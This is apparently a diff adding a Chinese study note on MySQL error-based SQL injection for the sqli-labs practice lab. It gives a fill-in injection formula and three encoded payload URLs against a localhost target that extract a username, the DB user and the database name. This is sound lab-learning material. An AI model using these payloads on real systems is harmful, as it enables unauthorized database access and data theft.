@@ -1,0 +1,9 @@
+报错注入就是在报错中返回你想要的数据，比如在报错中返回，数据库名称，用户名称，表名，列名，字段...
+报错注入就是套公式：
+公式： and (select 1 from (select count(*),concat( floor(rand(0)*2),(select (select (爆错语句)) from information_schema.tables limit 0,1))x from information_schema.tables group by x )a)
+
+将报错语句改为你输入的语句
+例如：
+读取username字段 http://127.0.0.1/sqli-labs-master/Less-5/?id=1%27%20and%20(select%201%20from%20(select%20count(*),concat(%20floor(rand(0)*2),(select%20(select%20(select%20username%20from%20users%20limit%200,1))%20from%20information_schema.tables%20limit%201,1))x%20from%20information_schema.tables%20group%20by%20x%20)a)%20--+
+获取用户名 http://127.0.0.1/sqli-labs-master/Less-5/?id=1%27%20and%20(select%201%20from%20(select%20count(*),concat(%20floor(rand(0)*2),(select%20(select%20(select user()))%20from%20information_schema.tables%20limit%201,1))x%20from%20information_schema.tables%20group%20by%20x%20)a)%20--+
+获取数据库名 http://127.0.0.1/sqli-labs-master/Less-5/?id=1%27%20and%20(select%201%20from%20(select%20count(*),concat(%20floor(rand(0)*2),(select%20(select%20(select database()))%20from%20information_schema.tables%20limit%201,1))x%20from%20information_schema.tables%20group%20by%20x%20)a)%20--+
